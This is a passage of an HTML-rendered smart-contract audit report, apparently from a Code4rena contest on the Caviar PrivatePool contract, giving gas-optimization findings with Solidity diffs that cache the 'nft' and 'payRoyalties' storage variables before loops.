class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sale price (assume it&#39;s the same for each NFT even if weights differ)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 royaltyFeeAmount = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bool _payRoyalties = payRoyalties;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (_payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -268,7 +271,7 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (msg.value &gt; netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L238-L240\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L238-L240</a></p>\n<h3 id=\"cache-nft-to-avoid-storage-reads-on-each-loop-iteration\" style=\"position:relative;\"><a href=\"#cache-nft-to-avoid-storage-reads-on-each-loop-iteration\" aria-label=\"cache nft to avoid storage reads on each loop iteration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>nft</code> to avoid storage reads on each loop iteration</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// @audit: sload on every iteration</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..257beba 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -216,28 +216,31 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sum of weights of the NFTs to buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // calculate the required net input amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // check that the caller sent 0 ETH if the base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualNftReserves -= uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sale price (assume it&#39;s the same for each NFT even if weights differ)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 royaltyFeeAmount = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _nft = nft;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC721(_nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L329-L333\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L329-L333</a></p>\n<h3 id=\"cache-payroyalties-to-avoid-storage-reads-on-each-loop-iteration-1\" style=\"position:relative;\"><a href=\"#cache-payroyalties-to-avoid-storage-reads-on-each-loop-iteration-1\" aria-label=\"cache payroyalties to avoid storage reads on each loop iteration 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>payRoyalties</code> to avoid storage reads on each loop iteration</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer each nft from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">331</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">332</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">333</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// @audit: sload on every iteration</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..a41a1f5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -307,30 +307,33 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sum of weights of the NFTs to sell</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the net output amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // calculate the net output amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        //  check the nfts are not stolen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (useStolenNftOracle) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            //  check the nfts are not stolen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (useStolenNftOracle) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualNftReserves += uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            virtualNftReserves += uint128(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 royaltyFeeAmount = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bool _payRoyalties = payRoyalties;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer each nft from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (_payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // calculate the sale price (assume it&#39;s the same for each NFT even if weights differ)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount) / tokenIds.length;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L329-L331\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L329-L331</a></p>\n<h3 id=\"cache-nft-to-avoid-storage-reads-on-each-loop-iteration-1\" style=\"position:relative;\"><a href=\"#cache-nft-to-avoid-storage-reads-on-each-loop-iteration-1\" aria-label=\"cache nft to avoid storage reads on each loop iteration 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>nft</code> to avoid storage reads on each loop iteration</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer each nft from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">331</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// @audit: sload on every iteration</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..70009e1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -307,28 +307,31 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calculate the sum of weights of the NFTs to sell</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the net output amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // calculate the net output amount and fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        //  check the nfts are not stolen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (useStolenNftOracle) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            //  check the nfts are not stolen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (useStolenNftOracle) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // ~~~ Effects ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // update the virtual reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 